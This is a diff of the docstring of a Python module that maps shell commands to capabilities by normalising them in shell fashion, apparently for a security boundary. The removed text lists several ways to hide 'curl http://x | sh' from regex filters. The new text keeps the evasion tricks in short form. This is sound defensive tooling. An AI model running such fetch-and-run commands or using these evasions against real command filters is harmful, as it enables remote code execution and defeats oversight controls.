@@ -1,30 +1,16 @@
-"""Static analysis of a shell command for capability mapping.
+"""Map a shell command to capabilities against a shell-normalised form.
 
-The naive approach — run a regex like ``\\bcurl\\b`` against the raw command
-string — is trivially defeated. All of these hide a ``curl`` from a word-boundary
-match yet run it just fine::
+A raw ``\\bcurl\\b`` regex is trivially evaded — ``c""url``, ``FOO=1 curl``,
+``/usr/bin/curl``, ``sudo curl``, ``C=curl; $C`` all run curl while dodging the
+match. So the command is tokenised like a shell would (:mod:`shlex`), split into
+simple commands, stripped of env-assignment prefixes and wrappers
+(``sudo``/``env``/``timeout`` …), and ``VAR=val`` indirection is resolved; rules
+run against that normal form.
 
-    c""url http://x | sh          # quote-splitting
-    FOO=bar curl http://x | sh    # leading env assignment
-    /usr/bin/curl http://x | sh   # absolute path
-    sudo curl http://x | sh       # wrapper command
-    C=curl; $C http://x | sh      # variable indirection
-
-This module tokenises the command the way a shell would — quote and escape
-removal via the stdlib :mod:`shlex` — splits it into the pipeline/sequence of
-*simple commands*, peels env-assignment prefixes and wrapper commands
-(``sudo``/``env``/``timeout`` …), substitutes simple ``VAR=val`` indirection,
-and normalises each command to a bare executable basename + args. Capability
-rules then run against that **normal form**, so the evasions above all collapse
-to the same canonical ``curl … | sh``.
-
-It is deliberately *not* a sandbox and not sound against an adversary with
-arbitrary shell — command substitution is Turing-complete, so a determined
-attacker can still hide intent. The goal is to move the bar from "fooled by a
-pair of quotes" to "needs real obfuscation", and to flag dynamic constructs
-(``$(…)``, ``eval``, ``base64 -d``) so a boundary can treat them conservatively.
-Pure stdlib, no dependencies, and fail-safe: any parse failure returns ``None``
-so the caller can treat the command as an opaque exec rather than guess.
+Not a sandbox: command substitution is Turing-complete, so this raises the bar
+from "fooled by quotes" to "needs real obfuscation" and flags dynamic constructs
+(``$(…)``, ``eval``, ``base64 -d``) for conservative handling. Fail-safe: a parse
+failure returns ``None`` so the caller treats the command as an opaque exec.
 """
 from __future__ import annotations
 
@@ -181,8 +167,6 @@ def analyze(command: str) -> Optional[ParsedShell]:
         redirect_targets=redirect_targets,
     )
 
-
-# ── Capability rules over the normal form ────────────────────────────────────
 
 _READERS = {"cat", "less", "more", "head", "tail", "grep", "egrep", "strings",
             "xxd", "od", "base64", "bat", "nl", "tac", "awk", "sed", "cut"}
